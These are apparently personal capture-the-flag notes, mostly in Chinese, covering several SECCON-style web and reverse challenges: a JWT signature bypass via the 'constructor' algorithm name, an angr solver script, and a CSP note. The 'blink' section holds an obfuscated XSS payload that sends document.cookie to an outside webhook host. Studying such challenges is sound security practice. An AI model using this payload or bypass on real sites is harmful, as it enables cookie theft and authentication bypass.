# web
### BadJwt
#nodejs
传入jwt,token为输入,secret为服务器随机生成36位密钥.下面这个函数负责计算secret
```js

const createSignature = (header, payload, secret) => {
	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
	const signature = algorithms[header.alg.toLowerCase()](data, secret);
	return signature;
}

const algorithms = {
	hs256: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
	hs512: (data, secret) => 
		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}
```

当传入特殊的属性如`constructor`时,`algorithms[header.alg.toLowerCase()](data, secret);`
返回函数的构造方法,
![image](https://i.imgur.com/8CnkB7o.png)
>TL;DR explanation: 
`const signature = algorithms[header.alg.toLowerCase()](data, secret);` is vulnerable to ["constructor"], calling the array constructor with the params -> results in an arr of dicts
const calculated_buf = Buffer.from(calculated_signature, 'base64'); casts everything to a primitive -> arr of dict gets "stringified"

### blink
#xss 
popover框架
```html
<iframe srcdoc="<a id=togglePopover href='cid:eval(atob(`ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2RjZTFiNmZjLTQ1M2MtNDI1Zi1hY2MyLTAwNTFkY2Y4NWMxOD8nK2RvY3VtZW50LmNvb2tpZSk`))'></a>" name="body"></iframe>
```
### eeeeejs


### simple calc
#xss 
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230919224449.png)

eval执行任意代码,但是存在csp `default-src http://simplecalc.seccon.games:3000/js/index.js 'unsafe-eval';

限制了源
# reverse
### jumpout

```python
import angr
import claripy
p = angr.Project('./jumpout', load_options={"auto_load_libs": False}) 
argv = [p.filename]
state = p.factory.entry_state(args = argv)
simgr = p.factory.simulation_manager(state)

simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))

if len(simgr.found) > 0:
    state = simgr.found[0]
    print(state.posix.dumps(0))
else: print("Not found...")
```
# pwn

# crypto

# Misc


---
# *相关wp*




2023-09-19   14:50